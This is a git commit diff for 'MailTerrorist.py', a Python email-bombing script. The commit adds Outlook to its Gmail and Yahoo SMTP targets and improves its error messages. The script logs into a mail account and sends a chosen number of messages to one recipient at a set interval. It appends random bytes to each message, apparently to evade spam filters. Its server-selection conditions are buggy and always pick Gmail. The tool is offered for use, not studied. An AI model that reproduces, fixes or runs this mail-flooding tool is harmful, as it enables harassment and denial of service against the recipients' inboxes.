f1f9f3595f1497e7dda779d48a416d8a27d1c980
peroh <43486978+BlackmanWhite@users.noreply.github.com>
2019-08-11 14:44:39 -0300

    Added outlook support + code improvements
    - Added outlook support
    - Improved error handling
    - Console UI improvements
    - Other minor changes

--- MailTerrorist/MailTerrorist.py
+++ MailTerrorist/MailTerrorist.py
@@ -37,7 +37,7 @@ def getInput(msg):
         else: break
     return inp
 
-server = getInput('Mail server:\n 1 - Gmail\n 2 - Yahoo\n\n> ')
+server = getInput('[>] Mail server:\n 1 - Gmail\n 2 - Yahoo\n 3 - Outlook\n\n> ')
 user = getInput('\nEmail: ')
 passwd = getpass.getpass('Password: ')
 
@@ -48,36 +48,50 @@ body = getInput('Message: ')
 emails = getInput('Number of emails to send: ')
 interval = getInput('Interval between messages: ')
 random = getInput('Number of random characters: ')
+print('\n')
 
-if server == 'gmail' or '1' or 'Gmail':
+if server.lower() == 'gmail' or '1':
     smtp_server = 'smtp.gmail.com'
     port = 587
-elif server == 'yahoo' or '2' or 'Yahoo':
+elif server.lower() == 'yahoo' or '2':
     smtp_server = 'smtp.mail.yahoo.com'
     port = 25
+elif server.lower() == 'outlook' or '3':
+    smtp_server = 'smtp-mail.outlook.com'
+    port = 587
 else:
-    sys.exit()
+    print "[-] Invalid mail server"
+    print '[!] Check your input for typos'
+    sys.exit(3)
 
 try:
     server = smtplib.SMTP(smtp_server,port)
     server.ehlo()
-    if smtp_server == "smtp.gmail.com":
+    if smtp_server == "smtp.gmail.com" or smtp_server == "smtp-mail.outlook.com":
             server.starttls()
     server.login(user,passwd)
     for i in range(1, int(emails)+1):
-        subject = subject + ' ' + os.urandom(int(random))
-        msg = 'From: ' + user + '\nSubject: ' + subject + '\n\n' + body + ' ' + os.urandom(int(random)/2) + '\n' + os.urandom(int(random)/2) 
+        subject = subject + ' ' + os.urandom(int(random/2))
+        msg = 'From: ' + user + '\nSubject: ' + subject + '\n\n' + body + ' ' + os.urandom(int(random)) + '\n' + os.urandom(int(random)) 
         server.sendmail(user,to,msg)
-        time.sleep(int(interval))
         print "[+] E-mails sent: %i" % i
+	time.sleep(float(interval))
     server.quit()
     print '\n[=] Done'
-    sys.exit()
+    sys.exit(0)
 except KeyboardInterrupt:
     print '[-] Canceled (KeyboardInterrupt)'
-    sys.exit()
+    sys.exit(1)
 except smtplib.SMTPAuthenticationError:
     print '\n[-] Could not authenticate account (Authentication error)'
     print '[!] Your username or password could have a typo, please try again'
-    print '[!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps'
-    sys.exit()
+    print '[!] Allow access to less secure apps on your gmail account in: https://www.google.com/settings/security/lesssecureapps'
+    sys.exit(2)
+except smtplib.SMTPDataError:
+    print '\n[-] Mail server refused the data (Data error)'
+    print '[!] Check your input for illegal characters'
+    print '[!] Check if your message or subject exceeds the character limit'
+    sys.exit(4)
+except smtplib.SMTPHeloError:
+    print('\n[-] The server refused the HELO message (Helo error)')
+    sys.exit(5)
